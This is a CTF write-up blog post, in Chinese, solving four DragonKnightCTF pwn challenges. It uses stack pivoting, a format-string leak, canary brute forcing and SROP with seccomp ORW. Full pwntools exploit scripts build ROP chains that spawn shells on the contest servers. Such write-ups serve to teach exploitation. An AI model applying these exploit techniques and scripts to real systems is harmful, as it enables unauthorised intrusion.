---
title: DragonKnightCTF-Pwn-wp
date: 2024-05-27 16:55:33
category: wp
tags: [栈溢出,canary,栈迁移,one_gadget]
---

# Pwn
## stack
### 分析
有栈溢出点，但只有8个字节，只能刚好覆盖到ret地址，所以要进行栈迁移
先用vmmap看一下能够写的位置

```shell
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn
          0x401000           0x402000 r-xp     1000   1000 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn
          0x402000           0x403000 r--p     1000   2000 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn
          0x403000           0x404000 r--p     1000   2000 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn
          0x404000           0x405000 rw-p     1000   3000 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7dbd000     0x7ffff7e15000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e15000     0x7ffff7e16000 ---p     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e16000     0x7ffff7e1a000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e1a000     0x7ffff7e1c000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e1c000     0x7ffff7e29000 rw-p     d000      0 [anon_7ffff7e1c]
    0x7ffff7fa2000     0x7ffff7fa5000 rw-p     3000      0 [anon_7ffff7fa2]
    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000      0 [anon_7ffff7fbb]
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000      0 [vvar]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000      0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
pwndbg>
```
先以0x404500为迁移地址(记为addr)，不行再换

再看看ida
```x86asm
.text:0000000000401176 ; int __fastcall main(int argc, const char **argv, const char **envp)
.text:0000000000401176                 public main
.text:0000000000401176 main            proc near               ; DATA XREF: _start+21↑o
.text:0000000000401176
.text:0000000000401176 buf             = byte ptr -100h
.text:0000000000401176
.text:0000000000401176 ; __unwind {
.text:0000000000401176                 endbr64
.text:000000000040117A                 push    rbp
.text:000000000040117B                 mov     rbp, rsp
.text:000000000040117E                 sub     rsp, 100h
.text:0000000000401185                 mov     eax, 0
.text:000000000040118A                 call    inits
.text:000000000040118F                 lea     rdi, s          ; "Hello, CTFer, do you know how to stack "...
.text:0000000000401196                 call    _puts
.text:000000000040119B                 lea     rax, [rbp+buf]  ; ret时填的位置
.text:00000000004011A2                 mov     edx, 110h       ; nbytes
.text:00000000004011A7                 mov     rsi, rax        ; buf
.text:00000000004011AA                 mov     edi, 0          ; fd
.text:00000000004011AF                 mov     eax, 0
.text:00000000004011B4                 call    _read
.text:00000000004011B9                 mov     eax, 0
.text:00000000004011BE                 leave
.text:00000000004011BF                 retn
.text:00000000004011BF ; } // starts at 401176
.text:00000000004011BF main            endp
```

### 思路
1. 利用第一次溢出将rbp转到addr的位置，并再次调用read函数
2. 利用第二次溢出将rsp转到addr+0x10的位置，将rbp转到addr+0x100的位置
3. 此时调用read函数，写的位置就是addr的位置，之后执行call函数时会将read地址压入addr+0x8，rbp压入addr，但此时是在addr处写值，这样便有足够长的空间来构造rop链，利用此次rop链泄露puts函数地址，计算libc基址
4. 在利用main函数构造栈帧，修改rbp，调用read函数
5. 计算好偏移，利用read函数的ret来构造rop链，可以直接用one_gadget,或者system函数

#### 第一次溢出
buf数组的长度为0x100(256)，后边就是rbp和ret地址
先在rbp处填上addr，ret处填上read函数的位置(包括给read函数传参的指令，即0x40119B)
之后程序执行leave(相当于 mov rsp,rbp ; pop rbp)时，会将rbp的值填为addr

![](/img/wp/DragonKnightCTF/stack_payload1_0.png)
![](/img/wp/DragonKnightCTF/stack_payload1_1.png)

#### 第二次溢出
继续调用read函数时，会从rbp+buf(即addr-0x100)处开始写值
执行call函数时，除了call函数中的leave ; ret 
函数执行结束后仍有一组 leave ; ret,利用这个leave ; ret ,可以将rsp放到addr+8处，rbp放到rbp指向的位置处
这样就将栈迁移到了一个新的地方，并且我们知道此时栈上的一个地址addr

![](/img/wp/DragonKnightCTF/stack_payload2_0.png)
![](/img/wp/DragonKnightCTF/stack_payload2_1.png)

#### ROP链
迁移完之后，也有了伪造的栈上的地址，只要计算好偏移，使得 `rbp-rsp <= (0x100-0x10) `,便可使执行read函数时能够在压入的rbp和返回地址上写值，同时要注意不能时rbp-rsp过小，从而放不下rop链

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

#p = process("./pwn")
p = remote("challenge.qsnctf.com",30347)
elf = ELF("./pwn")

main = 0x40117A
addr = 0x404500
read = 0x40119B
ret = 0x4011BF

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

pop_rdi = 0x401210 #0x0000000000401210 : pop rdi ; ret
leave_ret = 0x4011BE

# 修改rbp(为了下一次溢出将rsp修改到这里)
payload1 = b'a' * 0x100 + p64(addr) + p64(read)
p.sendafter(b"pivoting?",payload1)

# 修改rbp和rsp(这个rsp和第一次溢出时的rbp相等，但是执行了pop和ret操作，所以会增加0x10)
payload2 = b'a' * 0x100 + p64(addr+0x100) + p64(read)
p.send(payload2)

#gdb.attach(p)
sleep(0.1)

# 此时rbp位于addr+0x100，所以调用read函数时会在addr处开始写值
# 同时rsp位于addr+0x10处，然后执行了call read操作，使得addr+0x8处为read函数返回地址，addr处为rbp的值
# 所以第一个8字节为需要rbp填上的值，后面为ret到的地方
# 最后用main函数而不是read函数是因为我直接用read函数会报错，目前不知道原因
payload3 = p64(addr+0x100+0x10) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.send(payload3)

puts_addr = u64(p.recvuntil(b'Hello')[-12:-6].ljust(8,b'\x00'))
log.success("puts_addr: "+hex(puts_addr))

puts_offset = 0x084420
libc_base = puts_addr - puts_offset
system_addr = libc_base +0x052290
binsh = libc_base + 0x1b45bd
one_gadget = libc_base + 0xe3afe

# 修改rbp为addr+0x120，此时rsp为addr+0x30，刚好相差0xf0
payload4 = b'a'*0x100+p64(addr+0x100+0x20)+p64(read)
p.send(payload4)

sleep(0.1)

pop_r12 = libc_base + 0x2f709

# 第一个8字节为rbp，此时rbp为什么值都无所谓了，反正要拿到shell了
payload5 = p64(0) + p64(pop_r12) + p64(0) + p64(one_gadget)   # p64(0) + p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system_addr)
p.send(payload5)

p.interactive()
```

## ez_quiz
### 思路
漏洞点在gift函数中，有一个格式化字符串漏洞和栈溢出漏洞
想要程序运行到gift函数中需要小小逆向一下，逆向不难，token是按位取反后base32加密与encode_token对比
后边有个算术题，要注意一下用eval时c和python关于%运算符的处理稍有不同，可以特殊处理使得python的运算结果和c相同，但没必要，多运行几次就行了
之后利用格式化字符串漏洞泄露canary、main的rbp(用于计算bihsh的偏移)、以及ret地址(用于计算pie)

### exp
```python
from pwn import *
import base64

encode_token = "XOW3JPFLXGCK7TWMX6GMZIGOTK7ZJIELS65KBHU3TOG2BT4ZUDEJPGVATS7JDPVNQ2QL7EM3UCHZNGUC"
token = base64.b32decode(encode_token.encode())

token = list(token)

for i in range(len(token)):
    token[i] = ~token[i]
    token[i] = chr(token[i]&0xFF)

token = "".join(token).encode()

#context.log_level = 'debug'

#p = process("./attachment")
p = remote("challenge.qsnctf.com",30087)
elf = ELF("./attachment")

p.recvuntil(b'Please give me your token: ')
p.sendline(token)

p.recvuntil(b'Right!\n')
math = p.recvline()
math = math.decode()[:-3]
math_res = eval(math)
p.sendline(str(math_res).encode())
p.recvline(b'gift:\n')

payload1 = b'%11$p'+ b'%12$p'+b'%13$p' + b'x' + b'/bin/sh\x00'
p.sendline(payload1)
data = p.recv()
print(data)
data = data.split(b'x')
canary = int(b'0x'+data[1][:-1],16)
main_rbp = int(b'0x'+data[2][:-1],16)
main_2042_addr  =int(b'0x'+data[3],16)
rsp_addr = main_rbp - 0x1e0 
binsh = rsp_addr + 0x10
pie = main_2042_addr - 0x2042
log.success("canary: "+hex(canary))
log.success("binsh: "+hex(binsh))
log.success("pie: "+hex(pie))

gift_addr = pie + 0x149A
pop_rdi = pie+0x2072 # 0x0000000000002072 : pop rdi ; ret
system_plt = pie + 0x11C0
ret = pie + 0x101a
payload2 = b'a'*16 + b'/bin/sh\x00'+ b'a'*16 + p64(canary) + p64(main_rbp) + p64(pop_rdi) + p64(binsh) +  p64(ret) + p64(system_plt)

#gdb.attach(p)

p.sendline(payload2)

p.interactive()

```

## canary
### 分析
直接one by one爆破canary，爆破完canary之后就和正常的栈溢出题目没什么不同了,想怎么做怎么做
由于这题是静态链接的题，没有libc，所以用read函数写一个'/bin/sh\x00'，之后用系统调用获取shell

### exp
```python
from pwn import *

context.log_level = 'debug'

#p = process("./pwn_patched")
p = remote("challenge.qsnctf.com",31345)
elf=ELF("./pwn")

#######################################################
#################  explode canary  ####################
#######################################################
p.recvuntil(b'please input:\n')
canary = b'\x00'
i = 0
k = 2
while(k<=8):
    i = 0
    while(i<=255):
        canary_send = canary + i.to_bytes(1,'little')
        payload = b'a'*0x108 + canary_send
        print("[Running] explode the " + str(k) + "th bytes of canary ,now try " + hex(i) + ", canary: ",end="")
        print(canary_send)
        p.send(payload)
        res = p.recvline()
        print(b'res: ' + res)
        if(b'input' in res):
            canary = canary_send
            k+=1
            break
        else:
            p.recvline()
            i+=1
            if(i == 256):
                print("[Error] Exploit failed, retry")
                i = 0

print(b"[Success] canary: ",end="")
print(canary)

#######################################################
################      function     ####################
#######################################################
puts = 0x411770
write = 0x4489C0
read = 0x448920
vuln = 0x401D65

#######################################################
#################    ROPgadget     ####################
#######################################################
pop_rax = 0x4493d7 #0x00000000004493d7 : pop rax ; ret
pop_rdi = 0x4018c2 #0x00000000004018c2 : pop rdi ; ret
pop_rsi = 0x40f23e #0x000000000040f23e : pop rsi ; ret
pop_rdx = 0x4017cf #0x00000000004017cf : pop rdx ; ret
syscall = 0x4012d3 #0x00000000004012d3 : syscall

binsh = 0x4c2500

#######################################################
#################       send       ####################
#######################################################
payload1 = b'a'*0x108 + canary + p64(0) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(binsh) + p64(pop_rdx) + p64(0xffff) + p64(read) + p64(vuln)
p.sendline(payload1)

sleep(0.1)
p.sendline(b'/bin/sh\x00')

payload2 = b'b'*0x108+canary+p64(0)+p64(pop_rax) + p64(0x3b) +p64(pop_rdi)+p64(binsh)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(syscall)
p.recvuntil(b'input:')
p.sendline(payload2)

p.interactive()
```

## srop_seccomp
### 思路
srop，不过加上了seccomp，所以只好用open,read,write三个系统调用获取flag
先进行栈迁移，将栈迁移到bss段，在bss段构造sigreturnframe，从而ORW获取flag

### exp
```python
from pwn import *

#p = process("./chall")
p = remote("challenge.qsnctf.com",32252)

context.log_level = 'debug'
context.arch = 'amd64'

#######################################################
#################    ROPgadget     ####################
#######################################################
mov_rax_0xf = 0x401193 #0x0000000000401193 : mov rax, 0xf ; ret
syscall = 0x40118a
leave = 0x40143c
flag_str = 0x404390 
flag_addr = 0x405050
bss = 0x404060

#######################################################
#################       send       ####################
#######################################################
sigframe_open = SigreturnFrame()
sigframe_open.rax = constants.SYS_open
sigframe_open.rdi = flag_str
sigframe_open.rsi = 0
sigframe_open.rdx = 0
sigframe_open.rip = syscall
sigframe_open.rbp = bss + 0x110
sigframe_open.rsp = bss + 0x110

sigframe_read = SigreturnFrame()
sigframe_read.rax = constants.SYS_read
sigframe_read.rdi = 3
sigframe_read.rsi = flag_addr
sigframe_read.rdx = 0x100
sigframe_read.rip = syscall
sigframe_read.rbp = bss + 0x220
sigframe_read.rsp = bss + 0x220

sigframe_write = SigreturnFrame()
sigframe_write.rax = constants.SYS_write
sigframe_write.rdi = 1
sigframe_write.rsi = flag_addr
sigframe_write.rdx = 0x100
sigframe_write.rip = syscall
sigframe_write.rbp = bss + 0x330
sigframe_write.rsp = bss + 0x330

payload1  = p64(0xaaaa) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe_open)
payload1 += p64(0xaaaa) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe_read)
payload1 += p64(0xaaaa) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe_write)
payload1 += b'flag'

payload2 = b'a'*0x2a + p64(bss) + p64(leave)

p.recvuntil(b"easyhack\n")
p.send(payload1)
p.recvuntil(b'Do u know what is SUID?\n')
p.send(payload2)

p.interactive()
```

